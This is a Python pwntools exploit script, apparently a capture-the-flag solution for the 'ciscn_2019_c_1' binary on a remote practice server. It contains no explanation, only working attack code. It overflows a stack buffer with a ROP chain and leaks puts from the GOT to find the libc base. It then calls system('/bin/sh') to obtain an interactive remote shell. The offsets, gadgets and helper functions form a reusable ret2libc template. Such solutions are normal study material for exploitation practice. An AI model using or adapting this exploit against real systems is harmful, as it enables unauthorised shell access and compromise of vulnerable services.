from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')

p=remote('node4.buuoj.cn',26866)
# p = process('./ciscn_2019_c_1')
elf = ELF('./ciscn_2019_c_1')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('/root/pwn/test/libc-2.27.so')

pop_rdi = 0x400c83
ret = 0x4006b9

# debug('b *0x400AEE')


sla(b'Input your choice!\n',str(1))
payload = b'\x00' * (0x50 + 8) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.symbols['puts']) + p64(elf.symbols['encrypt'])
sla(b'Input your Plaintext to be encrypted\n', payload)

libc_base = l64() - libc.symbols['puts']
system,binsh = get_sb()

lg('libc_base',libc_base)
lg('system', system)

payload = b'\x00' * (0x50 + 8) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
sla(b'Input your Plaintext to be encrypted\n', payload)


# pause()
inter()
